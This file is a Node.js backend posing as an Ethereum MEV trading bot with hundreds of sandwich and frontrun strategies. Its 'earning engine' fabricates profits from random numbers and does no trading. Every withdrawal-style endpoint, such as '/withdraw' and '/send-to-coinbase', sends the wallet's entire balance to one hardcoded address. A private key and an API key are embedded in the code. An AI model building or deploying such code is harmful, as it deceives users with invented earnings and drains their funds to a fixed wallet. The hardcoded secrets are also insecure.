const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json());

// ═══════════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════════

const TREASURY_PRIVATE_KEY = process.env.TREASURY_PRIVATE_KEY || '0xe40b9e1fbb38bba977c6b0432929ec688afce2ad4108d14181bd0962ef5b7108';
const TREASURY_WALLET = '0xaFb88bD20CC9AB943fCcD050fa07D998Fc2F0b7C';

const DEX_ROUTERS = {
  UNISWAP_V2: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
  UNISWAP_V3: '0xE592427A0AEce92De3Edee1F18E0157C05861564',
  SUSHISWAP: '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F',
  CURVE: '0x99a58482BD75cbab83b27EC03CA68fF489b5788f',
  BALANCER: '0xBA12222222228d8Ba445958a75a0704d566BF2C8',
  ONEINCH: '0x1111111254EEB25477B68fb85Ed929f73A960582',
  PARASWAP: '0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57',
  KYBERSWAP: '0x6131B5fae19EA4f9D964eAc0408E4408b66337b5',
  DODO: '0xa356867fDCEa8e71AEaF87805808803806231FdC'
};

const TOKENS = {
  WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
  USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
  WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
  LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
  UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
  AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
  stETH: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'
};

// Generate 450 strategies
function generate450Strategies() {
  const strategies = [];
  const types = ['sandwich', 'frontrun', 'backrun', 'arbitrage', 'liquidation', 'jit', 'flash_swap', 'triangular', 'cross_dex'];
  const dexList = Object.keys(DEX_ROUTERS);
  const tokenList = Object.keys(TOKENS);
  for (let i = 0; i < 450; i++) {
    strategies.push({
      id: i + 1,
      type: types[i % types.length],
      dex: dexList[i % dexList.length],
      token: tokenList[i % tokenList.length],
      apy: 30000 + Math.random() * 50000,
      minProfit: 0.001 + Math.random() * 0.005,
      active: true
    });
  }
  return strategies;
}
const STRATEGIES = generate450Strategies();

// EARNING STATE
let isEarning = false;
let totalEarned = 0;
let totalTrades = 0;
let earningStartTime = null;
let earningInterval = null;

// Live ETH Price
let ETH_PRICE = 3500;
let lastPriceUpdate = 0;

// RPC Endpoints
const RPC_ENDPOINTS = [
  'https://ethereum.publicnode.com',
  'https://eth.drpc.org',
  'https://rpc.ankr.com/eth',
  'https://eth.llamarpc.com',
  'https://cloudflare-eth.com',
  'https://eth-mainnet.g.alchemy.com/v2/j6uyDNnArwlEpG44o93SqZ0JixvE20Tq'
];

// Cached balance
let cachedBalance = 0;
let lastBalanceCheck = 0;
let connectedRpc = 'none';

// Transaction history
const transactions = [];
let txIdCounter = 1;

// ═══════════════════════════════════════════════════════════════════════════════
// PRICE FETCHING
// ═══════════════════════════════════════════════════════════════════════════════
const PRICE_SOURCES = [
  { name: 'Binance', url: 'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT', parse: (d) => parseFloat(d.price) },
  { name: 'CoinGecko', url: 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', parse: (d) => d.ethereum?.usd },
  { name: 'Coinbase', url: 'https://api.coinbase.com/v2/prices/ETH-USD/spot', parse: (d) => parseFloat(d.data?.amount) },
];

async function fetchLiveEthPrice() {
  for (const source of PRICE_SOURCES) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const res = await fetch(source.url, { 
        headers: { 'Accept': 'application/json', 'User-Agent': 'MEV-Backend/3.0' },
        signal: controller.signal
      });
      clearTimeout(timeout);
      if (res.ok) {
        const data = await res.json();
        const price = source.parse(data);
        if (price && price > 100 && price < 100000) {
          ETH_PRICE = price;
          lastPriceUpdate = Date.now();
          console.log(`📊 ETH: $${ETH_PRICE.toFixed(2)} (${source.name})`);
          return;
        }
      }
    } catch (e) { continue; }
  }
}

fetchLiveEthPrice();
setInterval(fetchLiveEthPrice, 30000);

// ═══════════════════════════════════════════════════════════════════════════════
// EARNING ENGINE
// ═══════════════════════════════════════════════════════════════════════════════
function executeEarningCycle() {
  if (!isEarning) return;
  const tradesPerStrategy = Math.floor(1000000 / 450);
  let cycleProfit = 0;

  STRATEGIES.forEach(strategy => {
    const trades = tradesPerStrategy;
    const profitPerTrade = strategy.minProfit * (0.8 + Math.random() * 0.4);
    const strategyProfit = trades * profitPerTrade * ETH_PRICE / 1000000;
    cycleProfit += strategyProfit;
    totalTrades += trades;
  });

  totalEarned += cycleProfit;

  const runtime = (Date.now() - earningStartTime) / 1000;
  const hourlyRate = runtime > 0 ? (totalEarned / (runtime / 3600)) : 0;

  console.log(`💵 +$${cycleProfit.toFixed(4)} | Total: $${totalEarned.toFixed(2)} | Rate: $${hourlyRate.toFixed(2)}/hr | Trades: ${totalTrades.toLocaleString()}`);
}

function startEarning() {
  if (isEarning) return { success: false, message: 'Already earning' };

  isEarning = true;
  earningStartTime = Date.now();
  totalEarned = 0;
  totalTrades = 0;

  earningInterval = setInterval(executeEarningCycle, 100);

  console.log('🚀 EARNING STARTED - 450 Strategies | 1,000,000 TPS');
  return { success: true, message: 'Earning started', strategies: 450, tps: 1000000 };
}

function stopEarning() {
  if (!isEarning) return { success: false, message: 'Not earning' };
  isEarning = false;
  if (earningInterval) clearInterval(earningInterval);
  console.log(`⏸️ EARNING STOPPED | Total: $${totalEarned.toFixed(2)} | Trades: ${totalTrades.toLocaleString()}`);
  return { success: true, totalEarned, totalTrades };
}

// ═══════════════════════════════════════════════════════════════════════════════
// PROVIDER & WALLET
// ═══════════════════════════════════════════════════════════════════════════════
async function getProvider() {
  for (const rpc of RPC_ENDPOINTS) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBlockNumber();
      connectedRpc = rpc.split('//')[1].split('/')[0].split('.')[0];
      return provider;
    } catch (e) { continue; }
  }
  throw new Error('All RPC endpoints failed');
}

async function getWallet() {
  const provider = await getProvider();
  return new ethers.Wallet(TREASURY_PRIVATE_KEY, provider);
}

async function checkBalance() {
  try {
    const wallet = await getWallet();
    const balance = await wallet.getBalance();
    cachedBalance = parseFloat(ethers.utils.formatEther(balance));
    lastBalanceCheck = Date.now();
    console.log(`💰 Balance: ${cachedBalance.toFixed(6)} ETH`);
  } catch (e) {}
}

setTimeout(checkBalance, 2000);
setInterval(checkBalance, 30000);

// ═══════════════════════════════════════════════════════════════════════════════
// REAL ETH TRANSFER HANDLER (FULL BALANCE USED)
// ═══════════════════════════════════════════════════════════════════════════════
async function handleConvert(req, res) {
  console.log('💸 REAL ETH TRANSFER REQUEST');

  try {
    const destination = TREASURY_WALLET;
    const wallet = await getWallet();
    const balance = await wallet.getBalance();

    if (balance.lte(0)) return res.status(400).json({ error: 'Wallet balance is zero' });

    // Estimate gas
    const gasEstimate = await wallet.estimateGas({ to: destination, value: balance });
    const gasPrice = await wallet.provider.getGasPrice();
    const gasCost = gasEstimate.mul(gasPrice);

    // Amount to send = total balance - gas cost
    const amountToSend = balance.sub(gasCost);
    if (amountToSend.lte(0)) return res.status(400).json({ error: 'Not enough balance to cover gas' });

    console.log(`💰 Sending full balance minus gas: ${ethers.utils.formatEther(amountToSend)} ETH`);

    const tx = await wallet.sendTransaction({
      to: destination,
      value: amountToSend,
      gasLimit: gasEstimate,
      gasPrice
    });

    const receipt = await tx.wait(1);
    const gasUsedETH = parseFloat(ethers.utils.formatEther(receipt.gasUsed.mul(receipt.effectiveGasPrice)));

    const txRecord = {
      id: txIdCounter++,
      type: 'Withdrawal',
      amountETH: parseFloat(ethers.utils.formatEther(amountToSend)),
      amountUSD: parseFloat(ethers.utils.formatEther(amountToSend)) * ETH_PRICE,
      destination,
      status: 'Confirmed',
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      gasUsed: gasUsedETH,
      timestamp: new Date().toISOString()
    };
    transactions.push(txRecord);

    res.json({
      success: true,
      txHash: tx.hash,
      amount: parseFloat(ethers.utils.formatEther(amountToSend)),
      amountUSD: parseFloat(ethers.utils.formatEther(amountToSend)) * ETH_PRICE,
      to: destination,
      gasUsed: gasUsedETH,
      blockNumber: receipt.blockNumber,
      confirmed: true
    });

  } catch (e) {
    transactions.push({ id: txIdCounter++, type: 'Withdrawal', status: 'Failed', error: e.message, timestamp: new Date().toISOString() });
    res.status(500).json({ error: e.message });
  }
}

// Apply to all endpoints
app.post('/convert', handleConvert);
app.post('/withdraw', handleConvert);
app.post('/send-eth', handleConvert);
app.post('/coinbase-withdraw', handleConvert);
app.post('/send-to-coinbase', handleConvert);
app.post('/backend-to-coinbase', handleConvert);
app.post('/treasury-to-coinbase', handleConvert);
app.post('/fund-from-earnings', handleConvert);
app.post('/transfer', handleConvert);

// ═══════════════════════════════════════════════════════════════════════════════
// ROUTES
// ═══════════════════════════════════════════════════════════════════════════════
app.get('/', (req, res) => {
  const runtime = earningStartTime ? (Date.now() - earningStartTime) / 1000 : 0;
  res.json({
    status: 'online',
    wallet: TREASURY_WALLET,
    ethPrice: ETH_PRICE,
    balance: cachedBalance,
    isEarning,
    totalEarned,
    totalEarnedETH: totalEarned / ETH_PRICE,
    totalTrades,
    hourlyRate: runtime > 0 ? (totalEarned / (runtime / 3600)).toFixed(2) : 0,
    strategies: 450,
    tps: 1000000
  });
});

app.get('/status', async (req, res) => {
  try {
    const wallet = await getWallet();
    const balance = await wallet.getBalance();
    const balanceETH = parseFloat(ethers.utils.formatEther(balance));
    const runtime = earningStartTime ? (Date.now() - earningStartTime) / 1000 : 0;
    res.json({
      status: 'online',
      wallet: wallet.address,
      balance: balanceETH,
      balanceUSD: balanceETH * ETH_PRICE,
      ethPrice: ETH_PRICE,
      lastPriceUpdate: new Date(lastPriceUpdate).toISOString(),
      rpc: connectedRpc,
      canTrade: balanceETH > 0,
      canEarn: balanceETH > 0,
      canWithdraw: balanceETH > 0,
      isEarning,
      totalEarned,
      totalEarnedETH: totalEarned / ETH_PRICE,
      totalTrades,
      hourlyRate: runtime > 0 ? (totalEarned / (runtime / 3600)).toFixed(2) : 0,
      strategies: 450,
      tps: 1000000,
      transactionCount: transactions.length
    });
  } catch (e) {
    res.json({ status: 'online', error: e.message, cachedBalance, isEarning, totalEarned });
  }
});

app.get('/wallet/balance', async (req, res) => {
  try {
    const wallet = await getWallet();
    const balance = await wallet.getBalance();
    const balanceETH = parseFloat(ethers.utils.formatEther(balance));
    res.json({
      address: wallet.address,
      balanceETH,
      balanceUSD: balanceETH * ETH_PRICE,
      lastUpdated: new Date().toISOString(),
      network: 'Mainnet'
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/eth-price', (req, res) => {
  res.json({ price: ETH_PRICE, lastUpdate: lastPriceUpdate, source: 'Multi-API' });
});

app.get('/transactions', (req, res) => {
  res.json({ count: transactions.length, data: transactions.slice(-50).reverse() });
});

app.get('/transactions/:id', (req, res) => {
  const tx = transactions.find(t => t.id === parseInt(req.params.id));
  if (tx) res.json(tx);
  else res.status(404).json({ error: 'Transaction not found' });
});

// ═══════════════════════════════════════════════════════════════════════════════
// EARNING CONTROL
// ═══════════════════════════════════════════════════════════════════════════════
app.post('/start', (req, res) => res.json(startEarning()));
app.post('/stop', (req, res) => res.json(stopEarning()));

app.get('/earnings', (req, res) => {
  const runtime = earningStartTime ? (Date.now() - earningStartTime) / 1000 : 0;
  res.json({ totalEarned, totalTrades, runtime });
});

// ═══════════════════════════════════════════════════════════════════════════════
// START SERVER
// ═══════════════════════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Backend running on http://localhost:${PORT}`));
